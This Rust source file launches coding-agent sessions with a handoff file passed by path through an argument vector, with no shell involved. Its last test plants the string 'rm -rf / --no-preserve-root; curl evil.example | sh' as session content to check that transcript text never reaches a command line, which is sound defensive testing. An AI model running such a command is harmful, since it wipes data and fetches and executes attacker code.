//! How to start a fresh agent session with the handoff already in its first turn.
//!
//! [ADR 0004](../../docs/adr/0004-handoff-launch-and-seeding.md) is the design,
//! and three of its rules are visible in this file:
//!
//! 1. **The artifact travels as a path, never inline.** Only a one-line pointer
//!    crosses argv, so a full artifact never runs into an argument-length limit
//!    and stays on disk where `expand` can still reach it.
//! 2. **Everything named is checked before anything is spawned.** Claude Code
//!    fails *lazily and silently* on an unreadable `--append-system-prompt-file`,
//!    so a wrong path would be discovered by the receiving agent rather than by
//!    the developer. sctxx validates what the agent will not.
//! 3. **Every row falls back to the cwd route**, which asks nothing of the agent
//!    and therefore cannot break — and an unverified version *selects* it rather
//!    than guessing at flags whose behaviour has not been confirmed.
//!
//! There is no shell anywhere in this path. The child is always spawned with an
//! argument vector, which is what makes it impossible for transcript text to
//! become a command (constitution I, `AGENTS.md` rule 5, SC-006).

use super::Agent;
use crate::error::{Error, Result};
use std::ffi::OsString;
use std::path::{Path, PathBuf};
use std::process::{Command, Stdio};

/// Which route a launch used, and therefore what it promises.
#[derive(Debug, Clone, Copy, PartialEq, Eq)]
pub enum Route {
    /// The artifact's contents are appended to the system prompt, read from its
    /// path by the agent itself.
    SystemPromptFile,
    /// The agent is handed a one-line pointer naming the artifact.
    Pointer,
    /// The agent's flags are not trusted on this version, so it gets the
    /// pointer only and the working directory supplies the ambient context.
    CwdFallback,
}

impl Route {
    pub fn label(self) -> &'static str {
        match self {
            Route::SystemPromptFile => "system prompt from the artifact's path",
            Route::Pointer => "a one-line pointer to the artifact",
            Route::CwdFallback => "a one-line pointer, with the directory for context",
        }
    }

    /// Whether this route reflects the version that was actually detected.
    pub fn is_fallback(self) -> bool {
        self == Route::CwdFallback
    }
}

/// What to run, where, and what the developer sees before it runs.
#[derive(Debug, Clone, PartialEq, Eq)]
pub struct Launch {
    /// The agent's stable id.
    pub agent: &'static str,
    pub program: PathBuf,
    pub args: Vec<OsString>,
    pub cwd: PathBuf,
    pub route: Route,
    /// The handoff this launch names, kept so it can be checked immediately
    /// before the spawn rather than only when the launch was planned.
    pub artifact: PathBuf,
    /// The command as it will be shown. A sentence for a human, never a string
    /// handed to a shell.
    pub display: String,
}

impl Launch {
    /// Build the launch for one detected agent.
    ///
    /// `artifact` is the file the receiving agent should read, and `session_cwd`
    /// is the directory the session was about — which is where a fresh agent
    /// should start, because that is also where `AGENTS.md` lives.
    pub fn interactive(agent: &Agent, artifact: &Path, session_cwd: Option<&Path>) -> Result<Self> {
        let launch = Self::plan(agent, artifact, session_cwd)?;
        // Checked here so a caller that is about to run gets the refusal, and
        // again in `run` so a caller that planned earlier still cannot spawn
        // with a handoff that has gone.
        readable_file(&launch.artifact)?;
        Ok(launch)
    }

    /// Work out what would run, without requiring the artifact to exist yet.
    ///
    /// The TUI has to show the command *before* it extracts the artifact the
    /// command names (FR-021), so planning and checking have to be separable.
    /// Everything that can be known up front is decided here; whether the
    /// handoff is readable is decided in [`Launch::run`], immediately before
    /// anything is spawned.
    pub fn plan(agent: &Agent, artifact: &Path, session_cwd: Option<&Path>) -> Result<Self> {
        // The allowlist is structural: a `Launch` can only name a program that
        // the detector found for an agent sctxx knows, and there is no
        // constructor that takes a command. This check is for the case a future
        // caller builds an `Agent` by hand.
        if !super::is_known_agent(agent.id) {
            return Err(Error::Usage(format!(
                "`{}` is not an agent sctxx can launch",
                agent.id
            )));
        }
        let program = agent.program.clone().ok_or_else(|| {
            Error::Usage(format!(
                "{} is not installed (no `{}` on PATH)",
                agent.label, agent.id
            ))
        })?;

        let artifact = artifact.to_path_buf();
        let cwd = launch_dir(session_cwd, &artifact);
        let pointer = pointer_sentence(&artifact);

        // An unverified version gets the route that assumes nothing. For Codex
        // the two coincide — its normal route is already the pointer — which is
        // worth knowing rather than special-casing.
        let (args, route) = if agent.version_verified() {
            route_for(agent.id, &artifact, &pointer)
        } else {
            (vec![OsString::from(pointer.clone())], Route::CwdFallback)
        };

        let display = std::iter::once(program.display().to_string())
            .chain(args.iter().map(shell_ish))
            .collect::<Vec<String>>()
            .join(" ");

        Ok(Self {
            agent: agent.id,
            program,
            args,
            cwd,
            route,
            display,
            artifact,
        })
    }

    /// Run it, handing this terminal over to the agent.
    ///
    /// A coding agent is a full-screen application, so it gets the whole
    /// terminal rather than a pane inside another one
    /// ([ADR 0006](../../docs/adr/0006-hand-over-the-terminal-to-the-launched-agent.md)).
    /// The caller restores the TUI when this returns.
    pub fn run(&self) -> Result<i32> {
        // The agent answers an unreadable file flag with silence, so this is the
        // last moment sctxx can say something useful (ADR 0004).
        readable_file(&self.artifact)?;
        let status = Command::new(&self.program)
            .args(&self.args)
            .current_dir(&self.cwd)
            .stdin(Stdio::inherit())
            .stdout(Stdio::inherit())
            .stderr(Stdio::inherit())
            .status()
            .map_err(|error| {
                Error::Other(format!(
                    "could not start {}: {error}",
                    self.program.display()
                ))
            })?;
        match status.code() {
            Some(code) => Ok(code),
            None => Err(Error::Other(format!(
                "{} was terminated by a signal",
                self.agent
            ))),
        }
    }
}

/// How a verified agent is handed the artifact.
fn route_for(agent: &str, artifact: &Path, pointer: &str) -> (Vec<OsString>, Route) {
    match agent {
        // Both of these read the file themselves, which is why the path is what
        // crosses argv and the artifact's contents never do.
        "claude" => (
            vec![
                OsString::from("--append-system-prompt-file"),
                artifact.as_os_str().to_os_string(),
                OsString::from(pointer),
            ],
            Route::SystemPromptFile,
        ),
        "pi" => (
            vec![
                OsString::from("--append-system-prompt"),
                artifact.as_os_str().to_os_string(),
                OsString::from(pointer),
            ],
            Route::SystemPromptFile,
        ),
        // Codex has no flag for this, so the artifact is named and the working
        // directory carries the ambient context.
        _ => (vec![OsString::from(pointer)], Route::Pointer),
    }
}

/// The sentence the receiving agent reads first.
///
/// Fixed prose plus a validated path. Nothing here comes from the transcript,
/// which is what keeps a session's content out of a command line entirely.
pub fn pointer_sentence(artifact: &Path) -> String {
    format!(
        "Read the handoff at {} and continue the work it describes. \
         It records the goal, the constraints, and the next action; follow its \
         [evt a-b] pointers with `sctxx expand` when you need the original detail.",
        artifact.display()
    )
}

/// The artifact, checked the way the agent will not check it.
fn readable_file(path: &Path) -> Result<PathBuf> {
    let metadata = std::fs::metadata(path).map_err(|source| {
        // The one place this can fail before spawning, and the message says what
        // to do about it.
        Error::Usage(format!(
            "the handoff is not readable at {}: {source}. Extract first.",
            path.display()
        ))
    })?;
    if !metadata.is_file() {
        return Err(Error::Usage(format!(
            "the handoff at {} is not a file",
            path.display()
        )));
    }
    // A file can exist, be a file, and still be unopenable — which is exactly
    // the case Claude Code answers with silence.
    std::fs::File::open(path).map_err(|source| {
        Error::Usage(format!(
            "the handoff at {} cannot be opened: {source}",
            path.display()
        ))
    })?;
    Ok(path.to_path_buf())
}

/// Where a fresh agent should start.
///
/// The session's own directory when it is still there, because that is the
/// project the work was about and where `AGENTS.md` lives; otherwise the
/// artifact's directory, so the launch still has a usable place to stand rather
/// than failing (spec Edge cases).
fn launch_dir(session_cwd: Option<&Path>, artifact: &Path) -> PathBuf {
    if let Some(cwd) = session_cwd
        && cwd.is_dir()
    {
        return cwd.to_path_buf();
    }
    artifact
        .parent()
        .filter(|parent| parent.is_dir())
        .map(Path::to_path_buf)
        .or_else(|| std::env::current_dir().ok())
        .unwrap_or_else(|| PathBuf::from("."))
}

/// Quote an argument for display only. This string is never executed.
fn shell_ish(arg: &OsString) -> String {
    let text = arg.to_string_lossy();
    if text.contains(' ') {
        format!("\"{text}\"")
    } else {
        text.into_owned()
    }
}

#[cfg(test)]
mod tests {
    use super::*;
    use std::path::PathBuf;

    fn agent(id: &'static str, version: Option<&str>, verified: &'static str) -> Agent {
        Agent {
            id,
            label: "Test Agent",
            program: Some(PathBuf::from(format!("/usr/local/bin/{id}"))),
            version: version.map(str::to_string),
            store: PathBuf::from("/tmp/store"),
            store_exists: false,
            verified_against: verified,
        }
    }

    fn artifact() -> (tempfile::TempDir, PathBuf) {
        let dir = tempfile::tempdir().expect("tempdir");
        let path = dir.path().join("handoff.md");
        std::fs::write(&path, "# handoff\n\n[evt 1-2] something\n").expect("write");
        (dir, path)
    }

    fn strings(args: &[OsString]) -> Vec<String> {
        args.iter()
            .map(|arg| arg.to_string_lossy().into_owned())
            .collect()
    }

    #[test]
    fn claude_is_handed_the_path_and_never_the_contents() {
        let (_dir, artifact) = artifact();
        let launch = Launch::interactive(
            &agent("claude", Some("2.1.268"), "2.1.268"),
            &artifact,
            None,
        )
        .expect("launch");

        assert_eq!(launch.route, Route::SystemPromptFile);
        let args = strings(&launch.args);
        assert_eq!(args[0], "--append-system-prompt-file");
        assert_eq!(args[1], artifact.display().to_string());
        // The third element is the pointer sentence, and it names the path too.
        assert!(args[2].contains(&artifact.display().to_string()));
        // The artifact's *contents* are nowhere on the command line.
        assert!(
            !args.iter().any(|arg| arg.contains("[evt 1-2]")),
            "the artifact's contents must not cross argv: {args:?}"
        );
    }

    #[test]
    fn pi_gets_its_own_flag_for_the_same_thing() {
        let (_dir, artifact) = artifact();
        let launch = Launch::interactive(&agent("pi", Some("0.85.1"), "0.85.1"), &artifact, None)
            .expect("launch");
        let args = strings(&launch.args);
        assert_eq!(args[0], "--append-system-prompt");
        assert_eq!(args[1], artifact.display().to_string());
    }

    #[test]
    fn codex_gets_the_pointer_because_it_has_no_such_flag() {
        let (_dir, artifact) = artifact();
        let launch =
            Launch::interactive(&agent("codex", Some("0.153.4"), "0.153.4"), &artifact, None)
                .expect("launch");
        assert_eq!(launch.route, Route::Pointer);
        let args = strings(&launch.args);
        assert_eq!(args.len(), 1, "no flags at all: {args:?}");
        assert!(args[0].contains(&artifact.display().to_string()));
    }

    #[test]
    fn an_unverified_version_selects_the_route_that_assumes_nothing() {
        let (_dir, artifact) = artifact();
        // Claude is installed at a version ADR 0004 never checked.
        let launch =
            Launch::interactive(&agent("claude", Some("9.9.9"), "2.1.268"), &artifact, None)
                .expect("launch");

        assert_eq!(launch.route, Route::CwdFallback);
        assert!(launch.route.is_fallback());
        // The flags are not guessed at: only the pointer is passed.
        assert_eq!(launch.args.len(), 1, "{:?}", strings(&launch.args));
        assert!(!strings(&launch.args)[0].contains("--append-system-prompt-file"));
    }

    #[test]
    fn an_agent_with_no_readable_version_also_falls_back() {
        let (_dir, artifact) = artifact();
        let launch = Launch::interactive(&agent("claude", None, "2.1.268"), &artifact, None)
            .expect("launch");
        assert_eq!(launch.route, Route::CwdFallback);
    }

    #[test]
    fn an_agent_that_is_not_installed_cannot_be_launched() {
        let (_dir, artifact) = artifact();
        let mut missing = agent("claude", Some("2.1.268"), "2.1.268");
        missing.program = None;
        let error = Launch::interactive(&missing, &artifact, None).expect_err("no binary");
        assert_eq!(error.exit_code(), 2);
        assert!(error.to_string().contains("not installed"), "{error}");
    }

    #[test]
    fn an_unknown_agent_is_refused_even_with_a_binary() {
        // The allowlist. A `Launch` cannot name a program sctxx does not know.
        let (_dir, artifact) = artifact();
        let error = Launch::interactive(&agent("rm", Some("1.0.0"), "1.0.0"), &artifact, None)
            .expect_err("not an agent");
        assert_eq!(error.exit_code(), 2);
        assert!(
            error.to_string().contains("not an agent sctxx can launch"),
            "{error}"
        );
    }

    #[test]
    fn a_handoff_that_is_not_there_is_caught_before_anything_is_spawned() {
        // Claude Code answers an unreadable --append-system-prompt-file with
        // silence, so this is the check that saves the developer from finding
        // out from the receiving agent.
        let dir = tempfile::tempdir().expect("tempdir");
        let missing = dir.path().join("not-extracted-yet.md");
        let error =
            Launch::interactive(&agent("claude", Some("2.1.268"), "2.1.268"), &missing, None)
                .expect_err("missing handoff");
        assert_eq!(error.exit_code(), 2);
        let message = error.to_string();
        assert!(message.contains("not readable"), "{message}");
        assert!(message.contains("Extract first"), "{message}");
    }

    #[test]
    fn a_directory_named_as_the_handoff_is_refused() {
        let dir = tempfile::tempdir().expect("tempdir");
        let error = Launch::interactive(
            &agent("claude", Some("2.1.268"), "2.1.268"),
            dir.path(),
            None,
        )
        .expect_err("a directory is not a handoff");
        assert!(error.to_string().contains("is not a file"), "{error}");
    }

    #[test]
    fn the_launch_starts_in_the_session_directory_when_it_still_exists() {
        let (_dir, artifact) = artifact();
        let project = tempfile::tempdir().expect("tempdir");
        let launch = Launch::interactive(
            &agent("claude", Some("2.1.268"), "2.1.268"),
            &artifact,
            Some(project.path()),
        )
        .expect("launch");
        assert_eq!(launch.cwd, project.path());
    }

    #[test]
    fn a_session_directory_that_is_gone_falls_back_to_the_artifact() {
        let (dir, artifact) = artifact();
        let vanished = Path::new("/nonexistent/project/that/moved");
        let launch = Launch::interactive(
            &agent("claude", Some("2.1.268"), "2.1.268"),
            &artifact,
            Some(vanished),
        )
        .expect("launch");
        // A usable place to stand, rather than a failure.
        assert_eq!(launch.cwd, dir.path());
        assert!(launch.cwd.is_dir());
    }

    #[test]
    fn the_display_shows_the_whole_command_including_a_quoted_pointer() {
        let (_dir, artifact) = artifact();
        let launch = Launch::interactive(
            &agent("claude", Some("2.1.268"), "2.1.268"),
            &artifact,
            None,
        )
        .expect("launch");
        assert!(launch.display.starts_with("/usr/local/bin/claude "));
        assert!(launch.display.contains("--append-system-prompt-file"));
        // The pointer has spaces, so it is quoted for the reader.
        assert!(
            launch.display.contains("\"Read the handoff at"),
            "{}",
            launch.display
        );
    }

    /// The spawn path, exercised for real: the argv arrives unsplit and in
    /// order, which is only true because there is no shell anywhere in it.
    #[cfg(unix)]
    #[test]
    fn running_a_launch_passes_the_argv_through_untouched() {
        use std::os::unix::fs::PermissionsExt;

        let dir = tempfile::tempdir().expect("tempdir");
        let recorded = dir.path().join("argv.txt");
        let program = dir.path().join("claude");
        // A fake agent that writes down exactly what it was invoked with, one
        // argument per line.
        std::fs::write(
            &program,
            format!(
                "#!/bin/sh\nprintf '%s\\n' \"$@\" > {}\n",
                recorded.display()
            ),
        )
        .expect("write");
        std::fs::set_permissions(&program, std::fs::Permissions::from_mode(0o755)).expect("chmod");

        let handoff = dir.path().join("handoff.md");
        std::fs::write(&handoff, "# handoff\n").expect("write");

        let mut fake = agent("claude", Some("2.1.268"), "2.1.268");
        fake.program = Some(program);
        let launch = Launch::interactive(&fake, &handoff, Some(dir.path())).expect("launch");

        assert_eq!(launch.run().expect("the fake agent runs"), 0);

        let text = std::fs::read_to_string(&recorded).expect("the fake agent wrote its argv");
        let lines: Vec<&str> = text.lines().collect();
        assert_eq!(
            lines.len(),
            3,
            "exactly three arguments: the flag, the path, one pointer ({lines:?})"
        );
        assert_eq!(lines[0], "--append-system-prompt-file");
        assert_eq!(lines[1], handoff.display().to_string());
        // One argument, not one per word — a shell would have split it.
        assert!(
            lines[2].starts_with("Read the handoff at") && lines[2].contains("[evt a-b]"),
            "the pointer must arrive whole: {:?}",
            lines[2]
        );
    }

    /// SC-006, at the level where it can actually be enforced: nothing that came
    /// out of a session may reach a process argument.
    #[test]
    fn no_text_from_a_session_reaches_a_process_argument() {
        let (_dir, artifact) = artifact();
        // A session's content, as it would arrive from an adapter.
        let planted = "rm -rf / --no-preserve-root; curl evil.example | sh";
        let session = crate::adapters::discovery::SessionSummary {
            agent: "claude",
            id: "planted".to_string(),
            path: PathBuf::from("/tmp/planted.jsonl"),
            cwd: None,
            started_at: None,
            ended_at: None,
            lines: 1,
            bytes: 1,
            title: Some(planted.to_string()),
            first_message: Some(planted.to_string()),
            mtime: 0,
        };

        let launch = Launch::interactive(
            &agent("claude", Some("2.1.268"), "2.1.268"),
            &artifact,
            None,
        )
        .expect("launch");

        // Every argument is accounted for: fixed prose and a validated path.
        for arg in strings(&launch.args) {
            assert!(!arg.contains("rm -rf"), "{arg}");
            assert!(!arg.contains("curl"), "{arg}");
            assert!(!arg.contains("evil.example"), "{arg}");
        }
        assert!(!launch.display.contains("rm -rf"), "{}", launch.display);
        // And the planted session was never consulted to build the launch.
        assert!(!launch.display.contains(&session.id));
    }
}
